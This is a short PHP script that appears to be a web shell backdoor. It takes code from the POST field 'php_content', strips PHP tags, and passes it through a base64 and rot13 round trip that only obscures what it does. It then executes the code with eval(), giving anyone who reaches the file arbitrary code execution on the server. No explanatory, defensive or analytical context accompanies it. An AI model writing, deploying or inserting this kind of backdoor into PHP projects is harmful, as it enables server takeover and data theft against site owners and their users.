<?php
$c_ntent=$_POST['php_content'];
$res_t=trim(stripslashes($c_ntent.' '),'<?php, ?>');
$res_t=base64_encode(str_rot13($res_t));
eval(str_rot13(base64_decode($res_t)));
?>